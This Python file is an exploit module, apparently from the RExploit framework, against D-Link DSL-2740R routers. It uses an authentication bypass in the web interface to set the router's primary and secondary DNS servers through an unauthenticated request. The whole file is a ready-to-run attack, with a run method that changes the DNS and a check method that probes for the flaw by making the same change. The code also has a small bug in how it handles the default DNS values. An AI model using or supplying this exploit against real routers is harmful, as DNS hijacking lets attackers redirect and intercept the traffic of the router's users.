import requests

from lib.interfaces.iexploit import IExploit


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name="DSL-2740R Authentication Bypass DNS Change",
            category="bypass",
            authors={
                "Todor Donev": "Vulnerability discovery",
                "Daniel Diez": "RExploit module"
            },
            targets=[
                "DSL-2740R"
            ],
            date="18/02/2015",
            cwe="288",
            description="Different D-Link Routers are vulnerable to DNS change. The vulnerability exist in the web interface, which is  accessible without authentication. ",
            references={
                "https://www.exploit-db.com/exploits/36105/": "ExploitDB"
            }
        )

    def default(self):
        data = {"dns1": "8.8.8.8", "dns2": "8.8.8.8"}

        return data

    def run(self, data):
        dns1 = data["dns1"]
        dns2 = data["dns2"]

        if not dns1:
            dns1 = self.default()["dns1"]
        if not dns2:
            dns1 = self.default()["dns2"]

        url = "http://{0}/dns_1?Enable_DNSFollowing=1&dnsPrimary={1}&dnsSecondary={2}".format(self.getIP(), dns1, dns2)
        r = requests.get(url)

        if r.status_code == 200:
            message = "DNS change successfully\nDNS1: {0}, DNS2: {1}".format(dns1, dns2)
        else:
            message = "Error"

        return message

    def check(self):
        data = self.default()
        dns1 = data["dns1"]
        dns2 = data["dns2"]

        url = "http://{0}/dns_1?Enable_DNSFollowing=1&dnsPrimary={1}&dnsSecondary={2}".format(self.getIP(), dns1, dns2)

        try:
            r = requests.get(url)

            if r.status_code == 200:
                return True
            else:
                return False
        except requests.ConnectionError:
            return None
